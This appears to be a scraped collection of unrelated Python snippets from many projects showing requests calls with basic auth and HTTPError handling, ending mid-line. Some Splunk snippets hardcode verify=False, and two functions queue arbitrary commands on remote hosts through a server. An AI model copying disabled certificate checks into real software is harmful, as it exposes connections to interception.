    api_URL = "https://sandbox.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials"
    get_token = requests.get(api_URL, auth=HTTPBasicAuth(consumer_key, consumer_secret))
    token = get_token.json()['access_token']
    return token 
**************************************
def export_project(opts):
    u = opts.scheme + '://' + opts.host + _api + opts.project_id
    r = requests.get(
            url=u,
            auth=HTTPBasicAuth(opts.username, opts.password),
            headers={'Content-Type': 'application/json'},
            verify=not (opts.insecure_skip_verify and opts.insecure_skip_verify))

    return r.json()

# Dictionary used to represent the response from the Lair API server 
**************************************
def validate(cls, username, password):
        HEADERS = {
            'Ubi-AppId': UBI_APP_ID,
            'Content-Type': 'application/json; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0',
            'Ubi-LocaleCode': 'en-US',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        payload = {'rememberMe': 'true'}
        r = requests.post(LOGIN_URL, headers=HEADERS, auth=HTTPBasicAuth(username, password), json=payload)
        if r.status_code == 200:
            return True
        else:
            return False 
**************************************
def send_request(self, commands, method='cli_show', timeout=30):
        timeout = int(timeout)
        payload = self._build_payload(commands, method)
        response = requests.post(self.url,
                                 timeout=timeout,
                                 data=payload,
                                 headers=self.headers,
                                 auth=HTTPBasicAuth(self.username, self.password),
                                 verify=self.verify)
        response = response.text
        return response 
**************************************
def __init__(self, url, principal, password=None, proxies={}, cert=False):

        self.url = url
        self.principal = principal
        self.password = password
        self.proxies = proxies

        if self.password is not None:
            self.auth = requests.auth.HTTPBasicAuth(principal=self.principal,
                                                    password=self.password)
        else:
            self.auth = BearerAuth(self.principal)

        self.cert = cert 
**************************************
def create_case(self, case):

        """
        :param case: The case details
        :type case: Case defined in models.py
        :return: TheHive case
        :rtype: json
        """

        req = self.url + "/api/case"
        data = case.jsonify()
        try:
            return requests.post(req, headers={'Content-Type': 'application/json'}, data=data, proxies=self.proxies, auth=self.auth, verify=self.cert)
        except requests.exceptions.RequestException as e:
            sys.exit("Error: {}".format(e)) 
**************************************
def get_case(self, case_id):
        """
            :param case_id: Case identifier
            :return: TheHive case
            :rtype: json
        """
        req = self.url + "/api/case/{}".format(case_id)

        try:
            return requests.get(req, proxies=self.proxies, auth=self.auth, verify=self.cert)
        except requests.exceptions.RequestException as e:
            sys.exit("Error: {}".format(e)) 
**************************************
def get_case_tasks(self, case_id, **attributes):
        req = self.url + "/api/case/task/_search"

        # Add range and sort parameters
        params = {
            "range": attributes.get("range", "all"),
            "sort": attributes.get("sort", [])
        }

        # Add body
        parent_criteria = {
            '_parent': {
                '_type': 'case',
                '_query': {
                    '_id': case_id
                }
            }
        }

        # Append the custom query if specified
        if "query" in attributes:
            criteria = {
                "_and": [
                    parent_criteria,
                    attributes["query"]
                ]
            }
        else:
            criteria = parent_criteria

        data = {
            "query": criteria
        }

        try:
            return requests.post(req, params=params, json=data, proxies=self.proxies, auth=self.auth, verify=self.cert)
        except requests.exceptions.RequestException as e:
            sys.exit("Error: {}".format(e)) 
**************************************
def get_case_template(self, name):

        """
        :param name: Case template name
        :return: TheHive case template
        :rtype: json

        """

        req = self.url + "/api/case/template/_search"
        data = {
            "query": {
                "_and": [{
                    "_field": "name",
                    "_value": name
                }, {
                    "status": "Ok"
                }]
            }
        }

        try:
            response = requests.post(req, json=data, proxies=self.proxies, auth=self.auth, verify=self.cert)
            json_response = response.json()

            if response.status_code == 200 and len(json_response) > 0:
                return response.json()[0]
            else:
                sys.exit("Error: {}".format("Unable to find case templates"))
        except requests.exceptions.RequestException as e:
            sys.exit("Error: {}".format(e)) 
**************************************
def create_alert(self, alert):

        """
        :param alert: TheHive alert
        :type alert: Alert defined in models.py
        :return: TheHive alert
        :rtype: json
        """

        req = self.url + "/api/alert"
        data = alert.jsonify()
        try:
            return requests.post(req, headers={'Content-Type': 'application/json'}, data=data, proxies=self.proxies, auth=self.auth, verify=self.cert)
        except requests.exceptions.RequestException as e:
            sys.exit("Error: {}".format(e)) 
**************************************
def getAllAppsList(self):
        appList = []
        url = self.splunk_rest + "/services/apps/local?search=disabled%3D0&count=0&f=title"

        logger.debug("i=\"%s\" Running requests.get() on url=%s with user=%s to obtain a list of all applications" % (self.stanzaName, url, self.srcUsername))
        #no srcUsername, use the session_key method    
        headers = {}
        auth = None
        
        if not self.srcUsername:
            headers={'Authorization': 'Splunk %s' % self.session_key}
        else:
            auth = HTTPBasicAuth(self.srcUsername, self.srcPassword)
        
        #Verify=false is hardcoded to workaround local SSL issues
        res = requests.get(url, auth=auth, headers=headers, verify=False)
        if (res.status_code != requests.codes.ok):
            logger.fatal("i=\"%s\" Could not obtain a list of all apps, URL=%s statuscode=%s reason=%s, response=\"%s\"" % (self.stanzaName, url, res.status_code, res.reason, res.text))
            sys.exit(-1)

        #Splunk returns data in XML format, use the element tree to work through it
        root = ET.fromstring(res.text)
        
        for child in root:
            #Working per entry in the results
            if child.tag.endswith("entry"):
                #Down to each entry level
                for innerChild in child:
                    #name attribute
                    if innerChild.tag.endswith("title"):
                        name = innerChild.text
                        appList.append(name)
                        logger.debug("i=\"%s\" name=\"%s\" is the app added to the list" % (self.stanzaName, name))
        return appList
        
    #As per https://stackoverflow.com/questions/1101508/how-to-parse-dates-with-0400-timezone-string-in-python/23122493#23122493 
**************************************
def runSearchJob(self, query):
        url = self.splunk_rest + "/servicesNS/-/%s/search/jobs" % (self.appName)
        logger.debug("i=\"%s\" Running requests.post() on url=%s with user=%s query=\"%s\"" % (self.stanzaName, url, self.srcUsername, query))
        data = { "search" : query, "output_mode" : "json", "exec_mode" : "oneshot" }
        
        #no srcUsername, use the session_key method    
        headers = {}
        auth = None
        if not self.srcUsername:
            headers = {'Authorization': 'Splunk %s' % self.session_key }
        else:
            auth = HTTPBasicAuth(self.srcUsername, self.srcPassword)
        res = requests.post(url, auth=auth, headers=headers, verify=False, data=data)
        if (res.status_code != requests.codes.ok):
            logger.error("i=\"%s\" URL=%s statuscode=%s reason=%s response=\"%s\"" % (self.stanzaName, url, res.status_code, res.reason, res.text))
        res = json.loads(res.text)
        
        #Log return messages from Splunk, often these advise of an issue but not always...
        if len(res["messages"]) > 0:
            firstMessage = res["messages"][0]
            if 'type' in firstMessage and firstMessage['type'] == "INFO":
                #This is a harmless info message ,most other messages are likely an issue
                logger.info("i=\"%s\" messages from query=\"%s\" were messages=\"%s\"" % (self.stanzaName, query, res["messages"]))
            else:
                logger.warn("i=\"%s\" messages from query=\"%s\" were messages=\"%s\"" % (self.stanzaName, query, res["messages"]))
        return res
    
    #We keep a remote excluded app list so we don't backup anything that we are requested not to backup... 
**************************************
def runSearchJob(self, query, earliest_time="-1h"):
        url = self.splunk_rest + "/servicesNS/-/%s/search/jobs" % (self.appName)
        logger.debug("i=\"%s\" Running requests.post() on url=%s with user=%s query=\"%s\"" % (self.stanzaName, url, self.destUsername, query))
        data = { "search" : query, "output_mode" : "json", "exec_mode" : "oneshot", "earliest_time" : earliest_time }
        
        #no destUsername, use the session_key method
        headers = {}
        auth = None
        if not self.destUsername:
            headers = {'Authorization': 'Splunk %s' % self.session_key }
        else:
            auth = HTTPBasicAuth(self.destUsername, self.destPassword)
        
        res = requests.post(url, auth=auth, headers=headers, verify=False, data=data)
        if (res.status_code != requests.codes.ok):
            logger.error("i=\"%s\" URL=%s statuscode=%s reason=%s, response=\"%s\"" % (self.stanzaName, url, res.status_code, res.reason, res.text))
        res = json.loads(res.text)
        
        #Log return messages from Splunk, often these advise of an issue but not always...
        if len(res["messages"]) > 0:
            firstMessage = res["messages"][0]
            if 'type' in firstMessage and firstMessage['type'] == "INFO":
                #This is a harmless info message ,most other messages are likely an issue
                logger.info("i=\"%s\" messages from query=\"%s\" were messages=\"%s\"" % (self.stanzaName, query, res["messages"]))
            else:
                logger.warn("i=\"%s\" messages from query=\"%s\" were messages=\"%s\"" % (self.stanzaName, query, res["messages"]))
        return res

    ###########################
    #
    # Main logic section
    #
    ##########################
    #restlist_override is when we are passed a dictionary with info on the restore requirements rather than obtaining this via a lookup commmand
    #config_override is for when we are passed a configuration dictionary and we do not need to read our config from stdin (i.e. we were not called by Splunk in the normal fashion) 
**************************************
def _request(self, verb, endpoint, data=None):
        """Request a url.

        :param endpoint: The api endpoint we want to call.
        :param verb: POST, GET, or DELETE.
        :param params: Optional build parameters.

        :type params: dict

        :raises requests.exceptions.HTTPError: When response code is not successful.

        :returns: A JSON object with the response from the API.
        """

        headers = {
            'Accept': 'application/json',
        }
        auth = HTTPBasicAuth(self.token, '')
        resp = None

        request_url = "{0}/{1}".format(self.url, endpoint)

        if verb == 'GET':
            resp = requests.get(request_url, auth=auth, headers=headers)
        elif verb == 'POST':
            resp = requests.post(request_url, auth=auth, headers=headers, json=data)
        elif verb == 'DELETE':
            resp = requests.delete(request_url, auth=auth, headers=headers)
        else:
            raise BadVerbError(verb)

        resp.raise_for_status()

        return resp.json() 
**************************************
def main():
    data_dir, docs = get_documents()

    with requests.session() as session:
        token = get_token(session)
        session.auth = BearerAuth(token)

        notebook_id = create_notebook(session)

        for location, docs in docs.items():
            section_name = location.strip('/').replace('/', '-')
            section_id = create_section(session, notebook_id, section_name)

            for doc in docs:
                upload_doc(session, section_id, data_dir, doc) 
**************************************
def http_get(self,ip,port,user,password,path,payload,auth_mode=0):
        url = "http://{}:{}/{}".format(ip,port,path)
        
        self.logger.debug("http_get: Sending: %s %s auth_mode=%d" % (url, payload, auth_mode) )
        if auth_mode == 0:
            auth = HTTPBasicAuth(user,password)
        elif auth_mode == 1:
            auth = HTTPDigestAuth(user,password)
        else:
            self.send_error("Unknown auth_mode '%s' for request '%s'.  Must be 0 for 'digest' or 1 for 'basic'." % (auth_mode, url) )
            return False
            
        try:
            response = requests.get(
                url,
                auth=auth,
                params=payload,
                timeout=5
            )
        # This is supposed to catch all request excpetions.
        except requests.exceptions.RequestException as e:
            self.send_error("Connection error for %s: %s" % (url, e))
            return False
        self.logger.debug("http_get: Got: code=%s", response.status_code)
        if response.status_code == 200:
            #self.logger.debug("http_get: Got: text=%s", response.text)
            return response.text
        elif response.status_code == 400:
            self.send_error("Bad request: %s" % (url) )
        elif response.status_code == 404:
            self.send_error("Not Found: %s" % (url) )
        elif response.status_code == 401:
            # Authentication error
            self.send_error(
                "Failed to authenticate, please check your username and password")
        else:
            self.send_error("Unknown response %s: %s" % (response.status_code, url) )
        return False 
**************************************
def get(self, url, params=None):
        r = requests.get(self.base_url + url,
                         params=params,
                         headers=self.headers,
                         auth=self.__get_auth())
        r.raise_for_status()
        return r.json() 
**************************************
def exists(self):
        basic_auth = HTTPBasicAuth(os.getenv('GEMMAUSERNAME'), os.getenv('GEMMAPASSWORD'))
        res = requests.get('https://gemma.msl.ubc.ca/rest/v2/datasets/{}/platforms'.format(self.dataset_short_name), auth=basic_auth)
        res.raise_for_status()
        return any(platform['shortName'] == self.platform
                   for platform in res.json()['data']) 
**************************************
def exists(self):
        basic_auth = HTTPBasicAuth(os.getenv('GEMMAUSERNAME'), os.getenv('GEMMAPASSWORD'))
        res = requests.get('https://gemma.msl.ubc.ca/rest/v2/datasets/{}/samples'.format(self.dataset_short_name), auth=basic_auth)
        res.raise_for_status()
        # all samples must have a batch factor
        return all('batch' in sample['sample']['factors'].values() for sample in res.json()['data']) 
**************************************
def get_dataset_info(self):
        basic_auth = HTTPBasicAuth(os.getenv('GEMMAUSERNAME'), os.getenv('GEMMAPASSWORD'))
        res = requests.get('https://gemma.msl.ubc.ca/rest/v2/datasets/{}'.format(self.experiment_id), auth=basic_auth)
        res.raise_for_status()
        return res.json()['data'][0] 
**************************************
def requires(self):
        res = requests.get('http://gemma.msl.ubc.ca/rest/v2/datasets/{}/samples'.format(self.experiment_id), auth=HTTPBasicAuth(os.getenv('GEMMAUSERNAME'), os.getenv('GEMMAPASSWORD')))
        res.raise_for_status()
        return [DownloadGeoSample(sample['accession']['accession'])
                for sample in res.json()['data'] if sample['accession']['externalDatabase']['name'] == 'GEO'] 
**************************************
def _execute(self, results: TestResultSet) -> Generator[events.ExecutionEvent, None, None]:
        for endpoint, test in self.schema.get_all_tests(wsgi_test, self.hypothesis_settings, self.seed):
            for event in run_test(
                self.schema,
                endpoint,
                test,
                self.checks,
                results,
                auth=self.auth,
                auth_type=self.auth_type,
                headers=self.headers,
            ):
                yield event
                if isinstance(event, events.Interrupted):
                    return 
**************************************
def _get_worker_kwargs(self, tasks_queue: Queue, events_queue: Queue, results: TestResultSet) -> Dict[str, Any]:
        return {
            "tasks_queue": tasks_queue,
            "events_queue": events_queue,
            "schema": self.schema,
            "checks": self.checks,
            "settings": self.hypothesis_settings,
            "auth": self.auth,
            "auth_type": self.auth_type,
            "headers": self.headers,
            "seed": self.seed,
            "results": results,
            "kwargs": {"request_timeout": self.request_timeout},
        } 
**************************************
def _get_worker_kwargs(self, tasks_queue: Queue, events_queue: Queue, results: TestResultSet) -> Dict[str, Any]:
        return {
            "tasks_queue": tasks_queue,
            "events_queue": events_queue,
            "schema": self.schema,
            "checks": self.checks,
            "settings": self.hypothesis_settings,
            "seed": self.seed,
            "results": results,
            "kwargs": {"auth": self.auth, "auth_type": self.auth_type, "headers": self.headers},
        } 
**************************************
def _prepare_wsgi_headers(
    headers: Optional[Dict[str, Any]], auth: Optional[RawAuth], auth_type: Optional[str]
) -> Dict[str, Any]:
    headers = headers or {}
    headers.setdefault("User-agent", USER_AGENT)
    wsgi_auth = get_wsgi_auth(auth, auth_type)
    if wsgi_auth:
        headers["Authorization"] = wsgi_auth
    return headers 
**************************************
def get_session(
    auth: Optional[Union[HTTPDigestAuth, RawAuth]] = None, headers: Optional[Dict[str, Any]] = None
) -> Generator[requests.Session, None, None]:
    with requests.Session() as session:
        if auth is not None:
            session.auth = auth
        session.headers["User-agent"] = USER_AGENT
        if headers is not None:
            session.headers.update(**headers)
        yield session 
**************************************
def get_requests_auth(auth: Optional[RawAuth], auth_type: Optional[str]) -> Optional[Union[HTTPDigestAuth, RawAuth]]:
    if auth and auth_type == "digest":
        return HTTPDigestAuth(*auth)
    return auth 
**************************************
def get_wsgi_auth(auth: Optional[RawAuth], auth_type: Optional[str]) -> Optional[str]:
    if auth:
        if auth_type == "digest":
            raise ValueError("Digest auth is not supported for WSGI apps")
        return _basic_auth_str(*auth)
    return None 
**************************************
def __call_camera(selfself, cam, type_url):
        try:
            url_complete = 'http://' + cam['ip'] + ":" + cam['port'] + type_url
            my_logger.debug("CALL: " + cam['id'] + ' --> ' + url_complete)
            headers = {'Referer': 'http://' + cam['ip'] + ":" + cam['port'] + ' HTTP/1.0',
                     'Authorization': 'Basic ' + b64encode("{0}:{1}".format(cam['user'], cam['pwd']))}
            my_logger.debug("Headers: " + str(headers))
            r = requests.get(url_complete, headers=headers, auth=HTTPBasicAuth(cam['user'], cam['pwd']))
            my_logger.info(cam['id'] + ' --> ' + "HTTP Status: {0}".format(r.status_code))
            if r.status_code != 200:
                my_logger.debug("Unable to contact camera!")
            return r
        except:
            my_logger.exception("Unable to call camera! " + str(sys.exc_info()[0])) 
**************************************
def apiCall(self, apiUrl, data, headers):
        
        self.Helpers.logMessage(
            self.LogFile,
            "JUMPWAY",
            "INFO",
            "Sending JumpWay REST Request")
            
        response = requests.post(
                        apiUrl, 
                        data=json.dumps(data), 
                        headers=headers, 
                        auth=HTTPBasicAuth(
                                    self._confs["iotJumpWay"]["App"], 
                                    self.createHashMac(
                                                self._confs["iotJumpWay"]["API"]["Secret"],
                                                self._confs["iotJumpWay"]["API"]["Secret"])))
                                                
        output = json.loads(response.content)
        
        self.Helpers.logMessage(
            self.LogFile,
            "JUMPWAY",
            "INFO",
            "JumpWay REST Response Received: " + str(output))
    
        return output 
**************************************
def restApiCall(self, apiUrl, data, headers):
        
        self.Helpers.logMessage(
            self.LogFile,
            "GENISYS",
            "INFO",
            "Sending GeniSys REST Request")
            
        response = requests.post(
                        apiUrl, 
                        data=json.dumps(data), 
                        headers=headers, 
                        auth=HTTPBasicAuth(
                                    str(self._confs["iotJumpWay"]["App"]), 
                                    self.createHashMac(
                                                self._confs["iotJumpWay"]["API"]["key"],
                                                self._confs["iotJumpWay"]["API"]["key"])))
                               
        output = json.loads(response.text)
        self.Helpers.logMessage(
            self.LogFile,
            "GENISYS",
            "INFO",
            "GeniSys REST Response Received: " + str(output))
    
        return output 
**************************************
def apiCall(self, apiUrl, data, headers):
        
        self.Helpers.logMessage(
            self.LogFile,
            "JUMPWAY",
            "INFO",
            "Sending JumpWay REST Request")
            
        response = requests.post(
                        apiUrl, 
                        data=json.dumps(data), 
                        headers=headers, 
                        auth=HTTPBasicAuth(
                                    self._confs["iotJumpWay"]["App"], 
                                    self.createHashMac(
                                                self._confs["iotJumpWay"]["API"]["Secret"],
                                                self._confs["iotJumpWay"]["API"]["Secret"])))
                                                
        output = json.loads(response.content)
        
        self.Helpers.logMessage(
            self.LogFile,
            "JUMPWAY",
            "INFO",
            "JumpWay REST Response Received: " + str(output))
    
        return output 
**************************************
def do_get(self, urlpath: str, params: Optional[Dict[str, str]] = None) -> requests.Response:
        resp = requests.get(self._make_url(urlpath), params=params, verify=self.ssl_verify,
                            cert=self.ssl_cert, auth=self.http_auth, timeout=self.timeout)

        if resp.status_code < 200 or resp.status_code >= 300:
            raise AptlyAPIException(self._error_from_response(resp), status_code=resp.status_code)

        return resp 
**************************************
def do_delete(self, urlpath: str, params: Optional[Dict[str, str]] = None,
                  data: Union[str, Dict[str, str], Sequence[Tuple[str, str]], None] = None,
                  json: Union[List[Dict[str, Any]], Dict[str, Any], None] = None) -> requests.Response:
        resp = requests.delete(self._make_url(urlpath), params=params, data=data, json=json,
                               verify=self.ssl_verify, cert=self.ssl_cert, auth=self.http_auth,
                               timeout=self.timeout)

        if resp.status_code < 200 or resp.status_code >= 300:
            raise AptlyAPIException(self._error_from_response(resp), status_code=resp.status_code)

        return resp 
**************************************
def registerGroup(groupname):
    header = {'Content-type': 'application/json'}
    data = {"groupname": groupname}
    requests.post(server + "/register/group", headers=header, data=json.dumps(data), auth=HTTPBasicAuth('admin', adminpass)) 
**************************************
def registerHost(hostname, interface):
    header = {'Content-type': 'application/json'}
    data = {"hostname": hostname, "interface": interface}
    requests.post(server + "/register/host", headers=header, data=json.dumps(data), auth=HTTPBasicAuth('admin', adminpass)) 
**************************************
def buildGroups(buildstr):
    header = {'Content-type': 'application/json'}
    data = {"buildstring": buildstr}
    requests.post(server + "/register/buildgroups", headers=header, data=json.dumps(data), auth=HTTPBasicAuth('admin', adminpass)) 
**************************************
def newAction(args):
    try:
        args = args.split(":", 3)
        target = args[1].strip()
        if target == "help":
            print("USAGE: action: <target_hostname>: <action_mode_opcode>: <arguments>")
            listObj("show: hosts")
            return
        mode = args[2].strip()
        if mode == "help":
            print("USAGE: action: <target_hostname>: <action_mode_opcode>: <arguments>")
            showModes()
            return
        argum = args[3].strip()
        if argum == "help":
            print("USAGE: action: <target_hostname>: <action_mode_opcode>: <arguments>")
            showModes()
            return
    except:
        print("Invalid syntax...")
        return
    opt = ""
    header = {'Content-type': 'application/json'}
    data = {"hostname": target, "mode": mode, "arguments": argum, "options": opt, "dtuser": user}
    request = requests.post(server + "/add/command/single", headers=header, data=json.dumps(data), auth=HTTPBasicAuth(authtok, "garbage"))
    if request.text == "success":
        print("SUCCESS! Action queued for host: " + target)
    else:
        print(request.text)
    return 
**************************************
def newGroupAction(args):
    try:
        args = args.split(":", 3)
        target = args[1].strip()
        if target == "help":
            print("USAGE: gaction: <target_groupname>: <action_mode_opcode>: <arguments>")
            listObj("show: groups")
            return
        mode = args[2].strip()
        if mode == "help":
            print("USAGE: gaction: <target_groupname>: <action_mode_opcode>: <arguments>")
            showModes()
            return
        argum = args[3].strip()
        if argum == "help":
            print("USAGE: gaction: <target_groupname>: <action_mode_opcode>: <arguments>")
            showModes()
            return
    except:
        print("Invalid syntax...")
        return
    opt = ""
    header = {'Content-type': 'application/json'}
    data = {"groupname": target, "mode": mode, "arguments": argum, "options": opt, "dtuser": user}
    request = requests.post(server + "/add/command/group", headers=header, data=json.dumps(data), auth=HTTPBasicAuth(authtok, "garbage"))
    if request.text == "success":
        print("SUCCESS! Action queued for group: " + target)
    else:
        print(request.text)
    return 
**************************************
def connect(self, url, username=None, password=None) -> bool:
        """
        Authenticates a user to the backend using auth class.
        :param url: String Backend endpoint url
        :param username: String Username credential of the user
        :param password: String Password credential of the user
        """

        self._url = url
        self.token = None
        self.username=username

        if username and password:
            try:
                token = requests.get(self._url + '/credentials/basic',
                                    auth=HTTPBasicAuth(username, password), timeout=5)

                if token.status_code == 200:
                    self.token = token.json()["access_token"]
                else:
                    return False
            except:
                return False

        # disconnect
        elif username and password == None:
            try:
                requests.get(self._url, timeout=5)
            except:
                return False
            return False

        return True 
**************************************
def get_auth(self):
        """
        Returns the authentication type (used for a request).
        :return: auth type: Dict
        """
        return None 
**************************************
def list_processes(self) -> dict:
        # TODO: Maybe format the result dictionary so that the process_id is the key of the dictionary.
        """
        Loads all available processes of the back end.
        :return: processes_dict: Dict All available processes of the back end.
        """
        processes = self.get('/processes', auth=False)

        if processes:
            response = self.parse_json_response(processes)

            if "processes" in response:
                return response["processes"]

        return [] 
**************************************
def list_collections(self) -> dict:
        """
        Loads all available imagecollections types.
        :return: data_dict: Dict All available data types
        """
        data = self.get('/collections', auth=False)

        if data:
            response = self.parse_json_response(data)

            if "collections" in response:
                return response["collections"]

        return [] 
**************************************
def backend_info(self) -> dict:
        """
        Loads all available imagecollections types.
        :return: data_dict: Dict All available data types
        """
        data = self.get('/', auth=False)

        response = None

        if data:
            response = self.parse_json_response(data)

        return response 
**************************************
def user_services(self) -> dict:
        """
        Loads all jobs of the current user.
        :return: jobs: Dict All jobs of the user
        """
        services = self.get('/services', auth=True)

        if services:
            services = self.parse_json_response(services)

            if "services" in services:
                services = services["services"]
            return services

        return services 
**************************************
def post(self, path, postdata):
        """
        Makes a RESTful POST request to the back end.
        :param path: URL of the request (without root URL e.g. "/data")
        :param postdata: Data of the post request
        :return: response: Response
        """

        auth_header = self.get_header()
        auth = self.get_auth()
        return requests.post(self._url+path, json=postdata, headers=auth_header, auth=auth, timeout=5) 
**************************************
def delete(self, path):
        """
        Makes a RESTful DELETE request to the back end.
        :param path: URL of the request (without root URL e.g. "/data")
        :return: response: Response
        """
        auth_header = self.get_header()
        auth = self.get_auth()
        return requests.delete(self._url+path, headers=auth_header, auth=auth, timeout=5) 
**************************************
def delete_job(self, job_id):
        path = "/jobs/{}".format(job_id)
        auth_header = self.get_header()
        auth = self.get_auth()
        return requests.delete(self._url+path, headers=auth_header, auth=auth, timeout=5) 
**************************************
def delete_service(self, service_id):
        path = "/services/{}".format(service_id)
        auth_header = self.get_header()
        auth = self.get_auth()
        return requests.delete(self._url+path, headers=auth_header, auth=auth, timeout=5) 
**************************************
def addTo(searchTerm, allUsers, countryStub, city=None):

    def usersFrom(location):
        complete = False
        page = 1
        users = []
        order = 'asc'
        while not complete:
            if page > 10:
                # well, we can't query anymore.
                if order == 'desc':
                    complete = True
                    continue
                order = 'desc'
                page = 1
            req = requests.get(
                'https://api.github.com/legacy/user/search/location:%s' %
                location,
                headers=headers, params={'start_page': page,
                                         'sort': 'joined',
                                         'order': order},
                auth=TOKEN_AUTH)
            page += 1
            try:
                jsusers = json.loads(req.content).get('users')
                if not len(jsusers):
                    complete = True
                    continue
                users += jsusers
            except:
                logger.warning("Failed to parse JSON:")
                logger.warning(req.content)
                complete = True

        return users

    jsonUsers = usersFrom(searchTerm)

    if not len(jsonUsers):
        return

    for user in jsonUsers:
        logger.info("FOUND -- %s -- %s" % (user.get('username'),
                                           user.get('location')))
        user.update({'country': countryStub,
                     'city': city})
        allUsers.append(user) 
**************************************
def query_nexus(query_url, timeout_sec, basic_auth=None):
    """Queries Nexus for an artifact

    :param query_url: (str) Query URL
    :param timeout_sec: (int) query timeout
    :param basic_auth (HTTPBasicAuth) object or none
    :return: requests.Response object
    :raises: RuntimeError
    """
    log = logging.getLogger(mod_logger + '.query_nexus')

    # Attempt to query Nexus
    retry_sec = 5
    max_retries = 6
    try_num = 1
    query_success = False
    nexus_response = None
    while try_num <= max_retries:
        if query_success:
            break
        log.debug('Attempt # {n} of {m} to query the Nexus URL: {u}'.format(n=try_num, u=query_url, m=max_retries))
        try:
            nexus_response = requests.get(query_url, auth=basic_auth, stream=True, timeout=timeout_sec)
        except requests.exceptions.Timeout:
            _, ex, trace = sys.exc_info()
            msg = '{n}: Nexus initial query timed out after {t} seconds:\n{e}'.format(
                n=ex.__class__.__name__, t=timeout_sec, r=retry_sec, e=str(ex))
            log.warn(msg)
            if try_num < max_retries:
                log.info('Retrying query in {t} sec...'.format(t=retry_sec))
                time.sleep(retry_sec)
        except (requests.exceptions.RequestException, requests.exceptions.ConnectionError):
            _, ex, trace = sys.exc_info()
            msg = '{n}: Nexus initial query failed with the following exception:\n{e}'.format(
                n=ex.__class__.__name__, r=retry_sec, e=str(ex))
            log.warn(msg)
            if try_num < max_retries:
                log.info('Retrying query in {t} sec...'.format(t=retry_sec))
                time.sleep(retry_sec)
        else:
            query_success = True
        try_num += 1

    if not query_success:
        msg = 'Unable to query Nexus after {m} attempts using URL: {u}'.format(
            u=query_url, m=max_retries)
        log.error(msg)
        raise RuntimeError(msg)

    if nexus_response.status_code != 200:
        msg = 'Nexus request returned code {c}, unable to query Nexus using URL: {u}'.format(
            u=query_url, c=nexus_response.status_code)
        log.error(msg)
        raise RuntimeError(msg)
    return nexus_response 
**************************************
def get_case_observables(self, case_id, **attributes):

        """
        :param case_id: Case identifier
        :return: list of observables
        ;rtype: json
        """

        req = self.url + "/api/case/artifact/_search"

        # Add range and sort parameters
        params = {
            "range": attributes.get("range", "all"),
            "sort": attributes.get("sort", [])
        }

        # Add body
        criteria = [{
            "_parent": {
                "_type": "case",
                "_query": {
                    "_id": case_id
                }
            }
        }, {
            "status": "Ok"
        }]

        # Append the custom query if specified
        if "query" in attributes:
            criteria.append(attributes["query"])

        data = {
            "query": {
                "_and": criteria
            }
        }

        try:
            return requests.post(req, params=params, json=data, proxies=self.proxies, auth=self.auth, verify=self.cert)
        except requests.exceptions.RequestException as e:
            sys.exit("Error: {}".format(e)) 

Python requests.HTTPError() Examples

**************************************
def get_yahoo_data(self):
        """
        Cycles through "yahoo_series"ids" to get data from the Yahoo Finance.
        """        
        import time
        
        print('\nGetting data from Yahoo Finance...')
        for series_name in list(self.yahoo_series_ids.keys()):
            series_data = DataSeries()
            series_id = self.yahoo_series_ids[series_name]
            print('\t|--Getting data for {}({}).'.format(series_name, series_id))
            success = False
            while success == False:
                try:
                    series_data.yahoo_response(series_id)
                except req.HTTPError:
                    delay = 5
                    print('\t --CONNECTION ERROR--',
                          '\n\t Sleeping for {} seconds.'.format(delay))
                    time.sleep(delay)
                else:
                    success = True
            self.primary_dictionary_output[series_name] = series_data
        print('Finished getting data from Yahoo Finance!') 
**************************************
def get_tc_queue_base(task_id):
    if task_id not in tc_base_cache:
        cache = True
        try:
            resp = requests.get(QUEUE_BASE + "task/%s" % task_id)
            resp.raise_for_status()
        except requests.HTTPError:
            try:
                resp = requests.get(OLD_QUEUE_BASE + "task/%s" % task_id)
                resp.raise_for_status()
            except requests.HTTPError:
                # In this case we didn't find it on either system, so make a guess
                cache = False
                value = QUEUE_BASE
            else:
                value = OLD_QUEUE_BASE
        else:
            value = QUEUE_BASE
        if cache:
            tc_base_cache[task_id] = value
    else:
        value = tc_base_cache[task_id]
    return value 
**************************************
def request(self, url, method, data=None):
        """
        The requester shortcut to submit a http request to CloutFlare
        :param url:
        :param method:
        :param data:
        :return:
        """
        method = getattr(requests, method)
        response = method(
            url,
            headers=self.headers,
            json=data
        )
        content = response.json()
        if response.status_code != 200:
            print(content)
            raise requests.HTTPError(content['message'])
        return content 
**************************************
def convert_to_mp4(url):
    cached = check_pony_cache(url)
    if cached is not None:
        return cached
    print("Converting {} to mp4...".format(url))
    result = requests.post("https://api.imgur.com/3/image", {
        "image": url,
        "type": "URL"
    }, headers={
        'Authorization': 'Client-ID {}'.format(settings.IMGUR_TOKEN),
        'Content-Type': 'application/x-www-form-urlencoded',
    })
    try:
        result.raise_for_status()
    except requests.HTTPError as e:
        print(e.response.content)
        return None
    mp4_url = result.json()['data'].get('mp4', None)
    if mp4_url is not None:
        cache_pony(url, mp4_url)
    return mp4_url 
**************************************
def post(self, resource_type, media_type, data,
             path=None, params=None):
        url = _format_url(self.host, resource_type, path, self.ssl)
        response = self.session.post(
            url,
            verify=self.verify_ssl,
            headers=self._get_headers(media_type),
            data=data,
            params=params)
        try:
            response.raise_for_status()
            if response.status_code == 204:
                return True
            return response.json()
        except requests.HTTPError:
            logger.error('Failed on request %s', url)
            logger.error(_format_error_message(response))
            raise 
**************************************
def put(self, resource_type, media_type, data,
            path=None, params=None):
        url = _format_url(self.host, resource_type, path, self.ssl)
        response = self.session.put(
            url,
            verify=self.verify_ssl,
            headers=self._get_headers(media_type),
            data=data,
            params=params)
        try:
            response.raise_for_status()
            if response.status_code == 204:
                return True
            return response.json()
        except requests.HTTPError:
            logger.error('Failed on request %s', url)
            logger.error(_format_error_message(response))
            raise 
**************************************
def delete(self, resource_type, media_type, data,
               path=None, params=None):
        url = _format_url(self.host, resource_type, path, self.ssl)
        response = self.session.delete(
            url,
            verify=self.verify_ssl,
            headers=self._get_headers(media_type),
            data=data,
            params=params)
        try:
            response.raise_for_status()
            if response.status_code == 204:
                return True
            return response.json()
        except requests.HTTPError:
            logger.error('Failed on request %s', url)
            logger.error(_format_error_message(response))
            raise 
**************************************
def get_last_measurement(self):
        """Get latest measurement timestamp and value.

        Returns:
            Dictionary of latest measurement timestamp and value

        Raises:
            requests.HTTPError if request failed
        """
        call_rate_limiter()
        response = requests.get(API_ENDPOINTS["time series pattern"]
